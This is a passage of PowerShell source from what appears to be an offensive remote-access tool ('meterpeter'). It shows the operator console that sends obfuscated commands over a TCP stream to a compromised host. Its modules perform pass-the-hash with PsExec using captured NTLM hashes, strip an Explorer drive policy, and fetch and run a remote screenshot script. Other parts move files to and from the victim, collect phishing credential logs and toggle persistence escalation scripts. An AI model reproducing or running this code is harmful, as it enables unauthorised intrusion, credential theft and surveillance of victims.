          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' -Force;Get-Item -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
        {
        $choise = $Null;
        $Command = $Null;
        }
      }
      If($choise -ieq "PtHash" -or $choice -ieq "pthash")
      { 
        ## Pass-The-Hash - Check for Module Requirements { Server::SYSTEM }
        write-host " Pass-The-Hash using PsExec.exe from sysinternals .." -ForegroundColor Blue -BackgroundColor White;
        $Server_Creds = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
        If(-not($Server_Creds) -or $Server_Creds -ieq $null){
          write-host "`n`n   [i] Abort:: [Server] needs to be Run as 'SYSTEM' (Admin) .." -ForegroundColor Red -BackgroundColor Black;
          $Command = $Null;
        }
        else
        {
          ## Server Running as 'SYSTEM' detected ..
          write-host " - Input Remote IP address: " -NoNewline;
          $pth_remote = Read-Host;
          write-host " - Input Capture NTLM Hash: " -NoNewline;
          $pth_hash = Read-Host;
          write-host "`n   PsExec * Pass-The-Hash" -ForegroundColor green;
          write-host "   ----------------------";
          ## PtH (pass-the-hash) PsExec settings
          $Arch_x64 = $env:PROCESSOR_ARCHITECTURE|findstr /C:"64";
          If(-not($pth_remote) -or $pth_remote -ieq $null){$pth_remote = "$localIpAddress"} # For Demonstration
          If(-not($pth_hash) -or $pth_hash -ieq $null){$pth_hash = "aad3b435b51404eeaad3b435b51404ee"} # For Demonstration
          If(-not($Arch_x64) -and $Flavor -ieq "Windows")
          {
            ## Running the x86 bits version of PsExec
            $BINnAME = "$Bin"+"PsExec.exe";
            $Sec_Token = "Administrator@"+"$pth_remote";
            write-host "   PsExec.exe -hashes :$pth_hash $Sec_Token" -ForeGroundColor yellow;write-host "`n";
            $pthbin = Test-Path -Path "$BINnAME";If(-not($pthbin)){
              Write-Host "`n   [i] Not Found: $BINnAME" -ForegroundColor Red -BackgroundColor Black;
              $Command = $Null;
            }
            else
            {
              start-sleep -seconds 2;cd $Bin;.\PsExec.exe -hashes :$pth_hash $Sec_Token;
              cd $IPATH;$Command = $Null;
            }
          }
          ElseIf($Arch_x64 -and $Flavor -ieq "Windows")
          {
            ## Running the x64 bits version of PsExec
            $BINnAME = "$Bin"+"PsExec64.exe";
            $Sec_Token = "Administrator@"+"$pth_remote";
            write-host "   PsExec64.exe -hashes :$pth_hash $Sec_Token" -ForeGroundColor yellow;write-host "`n";
            $pthbin = Test-Path -Path "$BINnAME";If(-not($pthbin)){
              Write-Host "`n   [i] Not Found: $BINnAME" -ForegroundColor Red -BackgroundColor Black;
              $Command = $Null;
            }
            else
            {
              start-sleep -seconds 2;cd $Bin;.\PsExec64.exe -hashes :$pth_hash $Sec_Token;
              cd $IPATH;$Command = $Null;
            }
          }
          Else
          {
            ## Linux Flavor detected { Abort::Not::Suported }
            # TODO: Check if PsExec runs well under linux::Wine ..
            # cd $Bin;wine64 PsExec64.exe -hashes :$pth_hash $Sec_Token;cd $IPATH;$Command = $Null;
            write-host "`n`n   [i] Abort:: This Module does not run under [$Flavor] .." -ForegroundColor red -BackgroundColor Black;
            $Command = $Null;
          }
        }
      }
      If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
      {
        $choise = $Null;
        $Command = $Null;
      }
      $choise = $Null;
      $set_time = $Null;
      $mace_path = $Null;
    }

    If($Command -ieq "Modules")
    {
      Clear-Host;
      Write-Host "`n$Modules";
      $Command = $Null;
    }

    If($Command -ieq "Info")
    {
      Write-Host "`n$Info";
      $Command = $Null;
    }
    
    If($Command -ieq "Screenshot")
    {
        $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -Destination $Env:TMP\Screenshot.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Screenshot.ps1`" -Screenshot 1;Remove-Item -Path `"$Env:TMP\Screenshot.ps1`" -Force"
    }

    If($Command -ieq "Download")
    {
      Write-Host " - Download Remote File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
        $Command = Var_Obfusc(Char_Obf($Command));
        $Command = $Command -replace "#","$File";
        $File = $File.Split('\')[-1];
        $File = $File.Split('/')[-1];
        $File = "$IPATH$File";
        $Save = $True;
      } Else {
        Write-Host "`n";
        $File = $Null;
        $Command = $Null;
      }
    }

    If($Command -ieq "Upload")
    {
      Write-Host " - Upload Local File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {

        If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
        {
          $File = "$IPATH$File";
        }

        If(([System.IO.File]::Exists("$File")))
        {
          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
          $FileBytes = "($FileBytes)";
          $File = $File.Split('\')[-1];
          $File = $File.Split('/')[-1];
          $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"}";
          $Command = Var_Obfusc(Char_Obf($Command));
          $Command = $Command -replace "#","$File";
          $Command = $Command -replace "@","$FileBytes";
          $Upload = $True;
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
          $Command = $Null;
        }
      } Else {
        Write-Host "`n";
        $Command = $Null;
      }
      $File = $Null;
    }

    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [x] Connection Lost with $Remote_Host !" -ForegroundColor Red -BackGroundColor white;
        $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
        Start-Sleep -Seconds 4;
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }
      $WaitData = $True;
    }

    If($Command -ieq "Exit")
    {
      write-Host "`n";
      Write-Host " [x] Closing Connection with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
      $check = Test-Path -Path "$env:LocalAppData\webroot\";
      If($check -ieq $True)
      {
        Start-Sleep -Seconds 2;
        write-host " [i] Deleted: '$env:LocalAppData\webroot\'" -ForegroundColor Yellow;
        cmd /R rmdir /Q /S "%LocalAppData%\webroot\";
        $bath = "$IPATH"+"WStore.vbs";
        $bathtwo = "$IPATH"+"$payload_name.ps1";
        $ck_one = Test-Path -Path "$bath";
        $ck_two = Test-Path -Path "$bathtwo";
        If($ck_one -ieq $True){write-host " [i] Deleted: '$bath'" -ForegroundColor Yellow;cmd /R del /Q /F "$bath"}
        If($ck_two -ieq $True){write-host " [i] Deleted: '$bathtwo'" -ForegroundColor Yellow;cmd /R del /Q /F "$bathtwo"}
      }
      Start-Sleep -Seconds 3;
      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -ieq "Clear" -or $Command -ieq "Cls" -or $Command -ieq "Clear-Host" -or $Command -ieq "return" -or $Command -ieq "modules")
    {
      Clear-Host;
      #Write-Host "`n$Modules";
    }
    $Command = $Null;
  }

  If($WaitData)
  {
    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
              $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
              Start-Sleep -Seconds 5;
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
          $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
          Start-Sleep -Seconds 5;
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($Info))
      {
        $Info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($Upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   saved    $File";
            $Command = $Null;
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   $File (Already Exists)" -ForegroundColor Red;
            $Command = $Null;
          }
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   File Missing" -ForegroundColor Red;
          $Command = $Null;
        }
        $File = $Null;
        $Save = $False;
        $Command = $Null; 
      }

      If($Upload)
      {
        If($OutPut -ne " ")
        {
          If($Cam_set -ieq "True")
          {
            $OutPut = $OutPut|findstr /s /I /C:"Device name:";
            write-host "`n`n    WebCam(s) Detected" -ForeGroundColor Green;
            write-host "    ------------------";
            Write-Host "  $OutPut";
            $Cam_set = "False";

          }ElseIf($SluiEOP -ieq "True"){
          
            cd mimiRatz
            ## Revert SluiEOP [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path SluiEOP.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut"
            $SluiEOP = "False"

         }ElseIf($COMEOP -ieq "True"){

            cd mimiRatz
            ## Revert CompDefault [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path CompDefault.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut"
            $COMEOP = "False"

          }else{
            $OutPut = $OutPut -replace "`n","";
            If($OutPut -match "GetBrowsers.ps1"){
                $sanitize = $OutPut -replace 'GetBrowsers.ps1','GetBrowsers.ps1 '
                $OutPut = $sanitize.split(' ')[0] # Get only the 1º upload path
            }
            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            Write-Host "   ------   -----------";
            Write-Host "   saved    $OutPut";
          }
          If($Tripflop -ieq "True")
          {
            Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full" -ForeGroundColor Yellow;
            $Tripflop = "False";
          }
          If($Flipflop -ieq "True")
          {
            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
            $Flipflop = "False";
          }
          If($Camflop  -ieq "True")
          {
            write-host "   image    `$env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
            $Camflop = "False";
          }
          If($Phishing  -ieq "True")
          {
            $OutPut = $OutPut -replace ".ps1",".log";
            write-host "   output   $OutPut";
            $Phishing = "False";
          }
          If($NewPhishing  -ieq "True")
          {
            $OutPut = $OutPut -replace "NewPhish.ps1","CredsPhish.log";
            write-host "   output   $OutPut";
            $NewPhishing = "False";
          }
          $Command = $Null;
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   $File (Already Exists Remote)" -ForeGroundColor red;
          $Command = $Null;
        }
        $Upload = $False;
      }
    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}